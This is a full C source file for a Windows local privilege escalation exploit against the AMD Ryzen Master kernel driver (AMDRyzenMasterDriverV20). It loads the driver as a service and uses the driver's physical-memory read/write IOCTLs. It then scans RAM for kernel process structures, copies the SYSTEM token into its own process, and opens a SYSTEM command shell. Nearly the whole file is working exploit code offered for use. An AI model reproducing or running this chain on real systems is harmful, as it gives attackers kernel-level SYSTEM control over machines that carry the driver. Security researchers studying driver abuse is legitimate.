/*
 * amd_lpe.c — LPE via AMDRyzenMasterDriverV20
 *
 * Chain:
 *   1. Deploy driver (copy + sc create + sc start) nếu chưa có
 *   2. Open \\.\AMDRyzenMasterDriverV20 (Admin only, no SeLoadDriverPriv)
 *   3. Load physical RAM ranges từ registry (guard WRITE)
 *   4. NtQuerySI → ntoskrnl VA
 *   5. trick2 approach: scan 2MB-aligned PA → ntoskrnl PA (NtBuildNumber 0xF000xxxx)
 *   6. Scan physical EPROCESS → System EPROCESS PA → System Token
 *   7. Scan physical EPROCESS → Current EPROCESS PA
 *   8. phys_write(current_EPROCESS.Token) = system_token → SYSTEM
 *   9. Spawn cmd.exe SYSTEM
 *
 * Build:
 *   cl /nologo /W3 /O2 amd_lpe.c /link kernel32.lib advapi32.lib ntdll.lib
 *
 * Run as Administrator in VM with AMDRyzenMasterDriverV20 loaded.
 * Host must be AMD CPU (CPUID check at DriverEntry).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <winsvc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver constants ────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define SVC_NAME         "AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u   /* IN:{u64 PA,u32 sz}  OUT:{PA,sz,data[sz]} at +12 */
#define IOCTL_PHYS_WRITE 0x81112F0Cu   /* IN:{u64 PA,u32 sz,data[sz]}                      */

/* ── EPROCESS offsets — Win10 21H2 (19041-19044) ────────────────────────── */
#define OFF_DTB   0x028   /* DirectoryTableBase (CR3) */
#define OFF_PID   0x440   /* UniqueProcessId          */
#define OFF_TOKEN 0x4B8   /* Token (_EX_FAST_REF)     */
#define OFF_NAME  0x5A8   /* ImageFileName[15]        */

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static HANDLE    g_dev = INVALID_HANDLE_VALUE;

/* ══════════════════════════════════════════════════════════════════════════
   PRIMITIVES
   ══════════════════════════════════════════════════════════════════════════ */

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;

    char vname[256]; DWORD vname_sz, vdata_sz, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD idx = 0; ; idx++) {
        vname_sz = sizeof vname; vdata_sz = 0;
        LONG r = RegEnumValueA(hKey, idx, vname, &vname_sz, NULL, &type, NULL, &vdata_sz);
        if (r == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vdata_sz < 20) continue;
        buf = (uint8_t*)malloc(vdata_sz);
        if (!buf) continue;
        if (RegQueryValueExA(hKey, vname, NULL, NULL, buf, &vdata_sz) == ERROR_SUCCESS)
            { sz = vdata_sz; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(hKey);
    if (!buf || sz < 20) { free(buf); return; }

    DWORD count = *(DWORD*)(buf + 16);
    uint8_t *p  = buf + 20;
    for (DWORD i = 0; i < count && g_nranges < MAX_RANGES; i++, p += 20) {
        if (p + 20 > buf + sz || p[0] != 3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        printf("  [range %d] PA 0x%012llX + %llu MB\n", g_nranges,
               (unsigned long long)g_ranges[g_nranges].base,
               (unsigned long long)(g_ranges[g_nranges].size >> 20));
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base &&
            pa + sz <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}

/* Phys READ — standard {uint64_t PA, uint32_t sz}, data at out[12] */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12 + sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz);
    if (!out) return 0;
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out + 12, sz);
    free(out);
    return ok && got >= 12;
}

/* Phys WRITE — guarded by pa_in_range() */
static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) {
        printf("  [!] BLOCKED write PA 0x%llX — not in RAM range\n",
               (unsigned long long)pa);
        return 0;
    }
    uint32_t in_sz = 12 + sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz);
    if (!in_buf) return 0;
    *(uint64_t*)(in_buf)     = pa;
    *(uint32_t*)(in_buf + 8) = sz;
    memcpy(in_buf + 12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════════
   DRIVER DEPLOYMENT
   ══════════════════════════════════════════════════════════════════════════ */
static int driver_start(void)
{
    /* Fast path: device already accessible */
    HANDLE h = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return 1; }

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) { printf("  [-] OpenSCManager: %lu\n", GetLastError()); return 0; }

    /* Try open existing service */
    SC_HANDLE svc = OpenServiceA(scm, SVC_NAME,
                                 SERVICE_START | SERVICE_QUERY_STATUS);
    if (!svc) {
        /* Try create — need driver path */
        char drv_path[MAX_PATH];
        if (!GetSystemDirectoryA(drv_path, sizeof drv_path)) {
            CloseServiceHandle(scm); return 0;
        }
        strcat_s(drv_path, sizeof drv_path, "\\AMDRyzenMasterDriver.sys");

        svc = CreateServiceA(scm, SVC_NAME, SVC_NAME,
                             SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS,
                             SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                             SERVICE_ERROR_NORMAL, drv_path, NULL, NULL, NULL, NULL, NULL);
        if (!svc) {
            printf("  [-] CreateService: %lu\n", GetLastError());
            CloseServiceHandle(scm);
            return 0;
        }
        printf("  [+] Service created\n");
    }

    SERVICE_STATUS ss = {0};
    QueryServiceStatus(svc, &ss);
    if (ss.dwCurrentState != SERVICE_RUNNING) {
        StartServiceA(svc, 0, NULL);
        for (int i = 0; i < 50; i++) {
            QueryServiceStatus(svc, &ss);
            if (ss.dwCurrentState == SERVICE_RUNNING) break;
            Sleep(100);
        }
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (ss.dwCurrentState == SERVICE_RUNNING) {
        printf("  [+] Driver running\n");
        return 1;
    }
    printf("  [-] Driver start failed (state=%lu)\n", ss.dwCurrentState);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
   KASLR — ntoskrnl VA
   ══════════════════════════════════════════════════════════════════════════ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG, PVOID, ULONG, PULONG);
typedef struct { HANDLE S; PVOID MB; PVOID IB; ULONG IS; ULONG F;
                 USHORT L,I,Lc,O; CHAR P[256]; } MOD;
typedef struct { ULONG C; MOD M[1]; } MODLIST;

static uint64_t get_ntoskrnl_va(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
    if (!fn) return 0;
    ULONG sz = 0; fn(11, NULL, 0, &sz); sz += 4096;
    MODLIST *ml = (MODLIST*)malloc(sz);
    if (!ml) return 0;
    fn(11, ml, sz, NULL);
    uint64_t va = (uint64_t)ml->M[0].IB;
    free(ml);
    return va;
}

/* ══════════════════════════════════════════════════════════════════════════
   ntoskrnl PA — scan 2MB-aligned NtBuildNumber
   ══════════════════════════════════════════════════════════════════════════ */
static uint64_t find_ntoskrnl_pa(uint64_t nt_va)
{
    /* Parse ntoskrnl.exe from disk → NtBuildNumber RVA */
    char path[MAX_PATH];
    GetWindowsDirectoryA(path, sizeof path);
    strcat_s(path, sizeof path, "\\system32\\ntoskrnl.exe");

    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD fsz = GetFileSize(hf, NULL);
    uint8_t *pe = (uint8_t*)malloc(fsz);
    DWORD rd = 0; ReadFile(hf, pe, fsz, &rd, NULL); CloseHandle(hf);

    /* Find NtBuildNumber export RVA */
    if (pe[0]!='M'||pe[1]!='Z') { free(pe); return 0; }
    int32_t elf = *(int32_t*)(pe+0x3C);
    uint32_t exp_rva = *(uint32_t*)(pe + elf + 0x88);
    /* rva→foff helper */
    uint16_t ns = *(uint16_t*)(pe+elf+6);
    uint16_t osz = *(uint16_t*)(pe+elf+20);
    uint32_t sbase = (uint32_t)elf + 24 + osz;
    uint32_t exp_foff = 0;
    for (uint16_t i=0; i<ns; i++) {
        uint32_t s=sbase+i*40;
        uint32_t va=*(uint32_t*)(pe+s+12), vsz=*(uint32_t*)(pe+s+16);
        if (!vsz) vsz=*(uint32_t*)(pe+s+24);
        uint32_t fo=*(uint32_t*)(pe+s+20);
        if (exp_rva>=va&&exp_rva<va+vsz) { exp_foff=fo+(exp_rva-va); break; }
    }
    if (!exp_foff||exp_foff+40>fsz) { free(pe); return 0; }

    const uint8_t *exp = pe + exp_foff;
    uint32_t nnames = *(uint32_t*)(exp+0x18);
    uint32_t rva_fns = *(uint32_t*)(exp+0x1C);
    uint32_t rva_nms = *(uint32_t*)(exp+0x20);
    uint32_t rva_ord = *(uint32_t*)(exp+0x24);

    /* foff of tables */
    uint32_t fo_fns=0, fo_nms=0, fo_ord=0;
    for (uint16_t i=0; i<ns; i++) {
        uint32_t s=sbase+i*40;
        uint32_t va=*(uint32_t*)(pe+s+12), vsz=*(uint32_t*)(pe+s+16);
        if (!vsz) vsz=*(uint32_t*)(pe+s+24);
        uint32_t fo=*(uint32_t*)(pe+s+20);
        if (!fo_fns && rva_fns>=va&&rva_fns<va+vsz) fo_fns=fo+(rva_fns-va);
        if (!fo_nms && rva_nms>=va&&rva_nms<va+vsz) fo_nms=fo+(rva_nms-va);
        if (!fo_ord && rva_ord>=va&&rva_ord<va+vsz) fo_ord=fo+(rva_ord-va);
    }

    uint32_t rva_build = 0;
    for (uint32_t i=0; i<nnames && fo_nms && fo_ord && fo_fns; i++) {
        uint32_t nm_rva = *(uint32_t*)(pe+fo_nms+i*4);
        uint32_t nm_fo = 0;
        for (uint16_t j=0; j<ns; j++) {
            uint32_t s=sbase+j*40;
            uint32_t va=*(uint32_t*)(pe+s+12), vsz=*(uint32_t*)(pe+s+16);
            if (!vsz) vsz=*(uint32_t*)(pe+s+24);
            uint32_t fo=*(uint32_t*)(pe+s+20);
            if (nm_rva>=va&&nm_rva<va+vsz) { nm_fo=fo+(nm_rva-va); break; }
        }
        if (!nm_fo||nm_fo>=fsz) continue;
        if (strcmp((char*)(pe+nm_fo), "NtBuildNumber") == 0) {
            uint16_t ord = *(uint16_t*)(pe+fo_ord+i*2);
            rva_build = *(uint32_t*)(pe+fo_fns+ord*4);
            break;
        }
    }
    free(pe);
    if (!rva_build) { printf("  [-] NtBuildNumber RVA not found\n"); return 0; }
    printf("  NtBuildNumber RVA = 0x%08X\n", rva_build);

    /* Known build from SharedUserData */
    uint32_t ssd_build = *(uint32_t*)(0x7FFE0000 + 0x260) & 0xFFFF;
    uint32_t cand_free = ssd_build | 0xF0000000;
    uint32_t cand_chk  = ssd_build | 0xC0000000;
    printf("  Expected: plain=0x%X free=0x%X chk=0x%X\n",
           ssd_build, cand_free, cand_chk);

    /* Scan 2MB-aligned PAs */
    const uint64_t STEP = 0x200000ULL;
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t base = (g_ranges[ri].base + STEP - 1) & ~(STEP-1);
        uint64_t end  = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = base; pa < end; pa += STEP) {
            if (!pa_in_range(pa + rva_build, 4)) continue;
            uint32_t val = 0;
            if (!phys_read(pa + rva_build, &val, 4)) continue;
            if (val != ssd_build && val != cand_free && val != cand_chk) continue;

            /* Secondary: MZ header */
            uint16_t mz = 0;
            phys_read(pa, &mz, 2);
            printf("  [match] PA=0x%012llX NtBuildNumber=0x%08X%s\n",
                   (unsigned long long)pa, val,
                   (mz == 0x5A4D) ? " [MZ OK]" : "");
            return pa;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
   EPROCESS SCAN
   ══════════════════════════════════════════════════════════════════════════ */
static uint64_t find_eprocess_by_pid(uint32_t target_pid)
{
    uint8_t page[0x1000];
    uint64_t candidates = 0, last_prog = 0;

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = g_ranges[ri].base; pa + 0x1000 <= end; pa += 0x1000) {
            if (pa - last_prog >= 0x40000000ULL) {
                printf("  [scan] %5llu MB  candidates=%llu\n",
                       (unsigned long long)(pa>>20),
                       (unsigned long long)candidates);
                last_prog = pa;
            }
            if (!phys_read(pa, page, sizeof page)) continue;

            for (int off = 0; off + 8 <= 0x1000; off += 8) {
                if (memcmp(page + off, "System\0\0", 6) &&
                    memcmp(page + off, "svchost\0", 7) &&
                    /* Match any process name at EPROCESS+OFF_NAME */
                    page[off] < 0x20) continue;

                uint64_t eproc_pa = pa + (uint64_t)off - OFF_NAME;
                if (!pa_in_range(eproc_pa, OFF_NAME + 16)) continue;

                uint8_t ep[OFF_NAME + 16];
                if (!phys_read(eproc_pa, ep, sizeof ep)) continue;

                uint64_t pid = *(uint64_t*)(ep + OFF_PID);
                if (pid != target_pid) continue;
                if (memcmp(ep + OFF_NAME, page + off, 6) != 0) continue;

                candidates++;
                uint64_t cr3 = *(uint64_t*)(ep + OFF_DTB);
                if (!cr3 || (cr3 & 0xFFF)) continue;

                return eproc_pa;
            }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
   MAIN
   ══════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("=== AMD Ryzen Master LPE ===\n\n");

    /* 1. Deploy / start driver */
    printf("[1] Driver deployment...\n");
    if (!driver_start()) {
        printf("  [-] Cannot start driver. Copy AMDRyzenMasterDriver.sys\n");
        printf("      to %%SystemRoot%%\\system32\\ first.\n");
        return 1;
    }

    /* 2. Open device (no SeLoadDriverPrivilege needed) */
    printf("\n[2] Opening device...\n");
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("  [-] CreateFile: %lu (run as Admin? AMD CPU?)\n", GetLastError());
        return 1;
    }
    printf("  [+] Device opened\n");

    /* 3. Load physical ranges */
    printf("\n[3] Physical memory ranges:\n");
    load_ranges();
    if (g_nranges == 0) {
        printf("  [-] No ranges — aborting\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] %d ranges\n", g_nranges);

    /* 4. ntoskrnl VA */
    printf("\n[4] ntoskrnl VA (NtQuerySI)...\n");
    uint64_t nt_va = get_ntoskrnl_va();
    if (!nt_va) { printf("  [-] Failed\n"); CloseHandle(g_dev); return 1; }
    printf("  [+] ntoskrnl VA = 0x%016llX\n", (unsigned long long)nt_va);

    /* 5. ntoskrnl PA */
    printf("\n[5] Scanning for ntoskrnl PA (2MB step)...\n");
    uint64_t nt_pa = find_ntoskrnl_pa(nt_va);
    if (!nt_pa) {
        printf("  [-] ntoskrnl PA not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] ntoskrnl PA = 0x%016llX\n", (unsigned long long)nt_pa);
    printf("  PA formula: target_PA = 0x%llX + (target_VA - 0x%llX)\n\n",
           (unsigned long long)nt_pa, (unsigned long long)nt_va);

    /* 6. Find System EPROCESS */
    printf("[6] Scanning for System EPROCESS (PID=4)...\n");
    uint64_t sys_eproc_pa = find_eprocess_by_pid(4);
    if (!sys_eproc_pa) {
        printf("  [-] System EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] System EPROCESS PA = 0x%016llX\n",
           (unsigned long long)sys_eproc_pa);

    /* Read System Token */
    uint64_t system_token = 0;
    if (!phys_read(sys_eproc_pa + OFF_TOKEN, &system_token, 8)) {
        printf("  [-] Cannot read System Token\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] System Token       = 0x%016llX\n",
           (unsigned long long)system_token);

    /* 7. Find current process EPROCESS */
    uint32_t my_pid = GetCurrentProcessId();
    printf("\n[7] Scanning for current EPROCESS (PID=%u)...\n", my_pid);
    uint64_t my_eproc_pa = find_eprocess_by_pid(my_pid);
    if (!my_eproc_pa) {
        printf("  [-] Current EPROCESS not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] Current EPROCESS PA = 0x%016llX\n",
           (unsigned long long)my_eproc_pa);

    /* Read current token (save for restore) */
    uint64_t orig_token = 0;
    phys_read(my_eproc_pa + OFF_TOKEN, &orig_token, 8);
    printf("  [+] Original Token      = 0x%016llX\n",
           (unsigned long long)orig_token);

    /* 8. Token swap */
    printf("\n[8] Writing System Token to current EPROCESS...\n");
    if (!phys_write(my_eproc_pa + OFF_TOKEN, &system_token, 8)) {
        printf("  [-] phys_write failed\n");
        CloseHandle(g_dev); return 1;
    }
    printf("  [+] Token swapped!\n");

    /* 9. Spawn SYSTEM shell */
    printf("\n[9] Spawning SYSTEM shell...\n");
    STARTUPINFOA si = {sizeof si};
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL,
                       NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                       NULL, NULL, &si, &pi)) {
        printf("  [+] cmd.exe spawned (PID=%lu) — should be SYSTEM\n",
               pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("  [-] CreateProcess: %lu\n", GetLastError());
    }

    /* 10. Restore token */
    printf("\n[10] Restoring original token...\n");
    phys_write(my_eproc_pa + OFF_TOKEN, &orig_token, 8);
    printf("  [+] Token restored\n");

    CloseHandle(g_dev);
    printf("\nDone.\n");
    return 0;
}
